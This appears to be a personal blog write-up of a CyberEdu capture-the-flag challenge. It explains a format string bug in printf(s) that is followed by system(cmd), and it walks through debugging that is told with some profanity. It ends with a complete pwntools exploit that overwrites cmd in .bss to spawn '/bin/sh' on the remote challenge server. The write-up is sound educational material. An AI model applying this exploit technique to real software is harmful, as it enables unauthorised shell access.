+++
date = '2026-05-01'
draft = false
title = 'CyberEdu pwn2 Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn"]
+++

## Challenge overview

We have a new version of our product.

---

This time, we need to overwrite a data segment in bss, using fmtstr. Continuation of [pwn1](https://irinasusca.github.io/pwn1-writeup). 


## Identifying the vulnerabilities

This is main:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[512]; // [rsp+0h] [rbp-200h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  fgets(s, 512, stdin);
  printf(s);
  system(cmd);
  return 0;
}
```

So, fmtstr to overwrite `cmd`. We can write "/bin/sh" in another .bss region, and put that address into cmd. And we're writing at the sixth offset:

![challenge-screenshot](counting.png#center)


I genuinely forgot how to do fmtstr stuff, but luckily we have the [internet](https://docs.pwntools.com/en/stable/fmtstr.html). So, all we need to do is locate at which byte our input starts popping up on the stack.

While debugging, I kept bumping into this fucking error, which held up my debugger *forever*.

`0x7f3ff1174a47 <printf_positional+3175>    mov    byte ptr [r12], al   <Cannot dereference [0x102f9]>`

I spent a grilion hours on this, trying different offsets, different bss areas, writing '/bin/sh' directly into cmd, but ALL resulted in this same issue. I even looked a writeup up, and it was the same exact fucking thing I was trying to do. I *did* forget that I should have written the string in little endian, but had my debugger worked, I would've noticed that in about two minutes. 

Anyways.. it was still showing some weird errors, but I added `context.arch = 'amd64'` and they disappeared.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/main')

cyberedu = '35.246.235.205:32399'
context.arch = 'amd64'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
        
writes = {
   0x404048: 0x404000,
   0x404000: 0x68732f6e69622f
  
}

#can't use this bc nullbyte breaking our payload?? 
#start = 6

payload = fmtstr_payload(6,writes)

print(payload)
p.sendline(payload)


p.interactive()

```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/pwn2.py)**.
